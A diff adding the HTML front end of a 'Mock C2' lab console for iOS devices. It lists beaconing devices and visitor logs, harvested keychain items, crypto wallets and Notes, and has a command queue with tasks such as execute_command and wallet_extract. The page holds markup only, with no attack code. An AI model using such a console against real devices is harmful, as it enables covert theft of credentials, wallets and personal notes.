@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mock C2 · 企业后台</title>
+<link rel="stylesheet" href="/__dash/assets/app.css">
+</head>
+<body>
+
+<aside id="side">
+  <div class="brand">
+    <div class="logo">C2</div>
+    <div><b>Mock C2 · 后台</b><small>lab console v4</small></div>
+  </div>
+  <nav id="nav">
+    <button data-m="overview" class="on"><span class="ico">◈</span>仪表盘</button>
+
+    <div class="grp">访问设备</div>
+    <button data-m="devices"><span class="ico">◉</span>设备列表<span class="cnt" id="cnt-dev">0</span></button>
+    <button data-m="visits"><span class="ico">◉</span>来访登记<span class="cnt" id="cnt-visits">0</span></button>
+
+    <div class="grp">资产采集</div>
+    <button data-m="apps"><span class="ico">▣</span>App 资产<span class="cnt" id="cnt-app">0</span></button>
+    <button data-m="war"><span class="ico">⚔</span>war 回传<span class="cnt" id="cnt-war">0</span></button>
+    <button data-m="notes"><span class="ico">≡</span>备忘录<span class="cnt" id="cnt-note">0</span></button>
+
+    <div class="grp">运行</div>
+    <button data-m="commands"><span class="ico">⚡</span>下发指令</button>
+    <button data-m="access"><span class="ico">⇄</span>访问审计</button>
+  </nav>
+  <div class="side-foot">
+    <span class="dot"></span>ingest live · <span id="tick" class="mono">--</span>
+    <div style="margin-top:8px"><button class="btn sm" onclick="location.href='/console'">▣ 入口·切换控制台</button></div>
+  </div>
+</aside>
+
+<main id="main">
+  <div id="crumb">console</div>
+  <div id="page-head">
+    <h1 id="m-title">仪表盘</h1><span class="sub" id="m-sub"></span>
+    <div class="spacer"></div>
+    <span class="pill mono" id="ts-mono">-</span>
+    <label class="pill">自动刷新 <span class="switch on" id="auto-sw"><i></i></span></label>
+    <button class="btn" id="refresh">↻ 刷新</button>
+  </div>
+
+  <!-- ══ 仪表盘 ══ -->
+  <section class="view on" data-m="overview">
+    <div class="kpis" id="kpis" style="grid-template-columns:repeat(6,1fr)"></div>
+    <div class="grid2">
+      <div class="card mb0">
+        <header><h3>采集通道分布</h3><span class="src">c2mock.db · packets</span></header>
+        <div class="bodywrap" style="max-height:340px"><table><thead><tr><th>通道</th><th style="width:58%">分布</th><th>份数</th></tr></thead><tbody id="ov-rows"></tbody></table></div>
+      </div>
+      <div class="card mb0">
+        <header><h3>设备状态（10min beacon 窗口）</h3><span class="src">DB 聚合</span></header>
+        <div class="bodywrap" style="max-height:340px"><table><thead><tr><th>设备</th><th>机型 / iOS</th><th>状态</th></tr></thead><tbody id="ov-online"></tbody></table></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══ 设备列表（DB 解析 + 资产钻取）══ -->
+  <section class="view" data-m="devices">
+    <div class="card mb0">
+      <header><h3>设备列表</h3><span class="src" id="dev-meta">- · - · -</span><span class="src">c2mock.db · packets+packet_meta 聚合 · 点击行看设备资产</span></header>
+      <div class="bodywrap" style="max-height:620px"><table><thead><tr>
+        <th>状态</th><th>进度</th><th>uuid</th><th>机型</th><th>iOS</th><th>IP</th><th>钱包</th><th>备忘录</th><th>war 包</th><th>应用</th><th>首次上线</th><th>最后上线</th><th></th></tr></thead><tbody id="dev-rows"></tbody></table></div>
+    </div>
+  </section>
+
+  <!-- ══ 来访登记 ══ -->
+  <section class="view" data-m="visits">
+    <div class="card mb0">
+      <header><h3>来访登记</h3><span class="src" id="visits-meta">- · -</span><span class="src">devices 台账 · sync 上报</span></header>
+      <div class="bodywrap" style="max-height:620px"><table><thead><tr>
+        <th>时间</th><th>IP</th><th>iOS</th><th>domain</th><th>Host</th><th>UA</th></tr></thead><tbody id="visit-rows"></tbody></table></div>
+    </div>
+  </section>
+
+  <!-- ══ App 资产 ══ -->
+  <section class="view" data-m="apps">
+    <div class="card">
+      <header><h3>App 资产 · 按回传包名</h3><span class="src">/u · c2_agent Bundle 容器扫描 · 原包不入库</span><span class="src" id="apps-meta"></span></header>
+      <div class="toolbar" style="padding:10px 16px 0;margin-bottom:0">
+        <input id="apps-kw" placeholder="搜索 bundleId / 名称 / lhu …">
+        <button class="btn sm" id="apps-search">检索</button>
+        <span style="flex:1"></span>
+        <button class="btn sm" id="apps-xall">▽ 全部展开</button>
+        <button class="btn sm" id="apps-call">△ 全部收起</button>
+      </div>
+      <div class="bodywrap" style="max-height:560px"><table><thead><tr><th style="min-width:190px">bundleId / 包名</th><th>名称</th><th>uuid</th><th>来源包</th><th>时间</th><th>操作</th></tr></thead><tbody id="apps-rows"></tbody></table></div>
+      <div class="pager" id="apps-pager"></div>
+    </div>
+  </section>
+
+  <!-- ══ war 回传 ══ -->
+  <section class="view" data-m="war">
+    <div class="card">
+      <header><h3>war 战果 · 按包名（accessGroup）</h3><span class="src">/war · keychain items + wallets · 原包不入库</span><span class="src" id="war-meta"></span></header>
+      <div class="toolbar" style="padding:10px 16px 0;margin-bottom:0">
+        <input id="war-kw" placeholder="搜索包名 / service / 账户 …">
+        <button class="btn sm" id="war-search">检索</button>
+      </div>
+      <div class="bodywrap" style="max-height:560px"><table><thead><tr><th>表</th><th>包名 (accessGroup)</th><th>service</th><th>account</th><th>rowid</th><th>来源包</th><th>时间</th><th>操作</th></tr></thead><tbody id="war-rows"></tbody></table></div>
+      <div class="pager" id="war-pager"></div>
+    </div>
+  </section>
+
+  <!-- ══ 备忘录（只显示解析结果）══ -->
+  <section class="view" data-m="notes">
+    <div class="card mb0">
+      <header><h3>备忘录 · 解析结果</h3><span class="src">nb 包正文 note list 平铺（不落数据库）</span><span class="src" id="notes-meta"></span></header>
+      <div class="toolbar" style="padding:10px 16px 0;margin-bottom:0">
+        <input id="notes-kw" placeholder="搜索标题 / 摘要 / lhu …">
+        <button class="btn sm" id="notes-search">检索</button>
+      </div>
+      <div class="bodywrap" style="max-height:600px"><table><thead><tr>
+        <th>#</th><th>标题</th><th>摘要</th><th>修改时间</th><th>回传时间</th><th>lhu</th></tr></thead><tbody id="notes-rows"></tbody></table></div>
+      <div class="pager" id="notes-pager"></div>
+    </div>
+  </section>
+
+  <!-- ══ 下发指令 ══ -->
+  <section class="view" data-m="commands">
+    <div class="ctrl-wrap">
+      <div class="card mb0">
+        <header><h3>指令载荷</h3><span class="src">command_queue · 下一发 /beacon 抵达即应答 · once 单发即清</span></header>
+        <div style="padding:14px 16px">
+          <div class="form-row">
+            <label class="f">预设类型
+              <select id="cmd-preset">
+                <option value="exit">exit</option>
+                <option value="execute_command">execute_command</option>
+                <option value="ls">ls</option>
+                <option value="download">download</option>
+                <option value="wallet_extract">wallet_extract</option>
+                <option value="memo_scan">memo_scan</option>
+                <option value="apps">apps</option>
+                <option value="custom">自定义 JSON …</option>
+              </select>
+            </label>
+            <label class="f" style="max-width:120px"><span>单发即清 (once)</span>
+              <div class="switch on" id="cmd-once"><i></i></div></label>
+            <button class="btn pri" id="cmd-send">武装下发</button>
+            <button class="btn" id="cmd-clear">清空队列</button>
+          </div>
+          <textarea id="cmd-json" rows="9" spellcheck="false">{}</textarea>
+        </div>
+      </div>
+      <div class="box mb0">
+        <h4>队列状态（后端 command.json）</h4>
+        <pre class="mono dim" id="cmd-current" style="font-size:12px;white-space:pre-wrap">-</pre>
+      </div>
+    </div>
+    <div class="card mt14">
+      <header><h3>下发历史（armed → dispatched → cleared）</h3><span class="src">commands 表</span></header>
+      <div class="bodywrap" style="max-height:360px"><table><thead><tr><th>#</th><th>command_id</th><th>type</th><th>params</th><th>armed</th><th>dispatched</th><th>client</th><th>state</th></tr></thead><tbody id="cmd-hist"></tbody></table></div>
+    </div>
+  </section>
+
+  <!-- ══ 访问审计 ══ -->
+  <section class="view" data-m="access">
+    <div class="card">
+      <header><h3>HTTP 访问流水</h3><span class="src">access_log</span></header>
+      <div class="bodywrap" style="max-height:620px"><table><thead><tr><th>时间</th><th>role</th><th>method</th><th>path</th><th>client</th><th>status</th><th>cost</th></tr></thead><tbody id="acc-rows"></tbody></table></div>
+    </div>
+  </section>
+</main>
+
+<!-- ══ 数据包详情 / 设备资产抽屉 ══ -->
+<div id="drawer">
+  <header><b id="dr-title" class="mono" style="font-size:13px">-</b><div class="spacer" style="flex:1"></div><button class="x" id="dr-close">✕</button></header>
+  <pre id="dr-body"></pre>
+</div>
+
+<script src="/__dash/assets/app.js"></script>
+</body>
+</html>
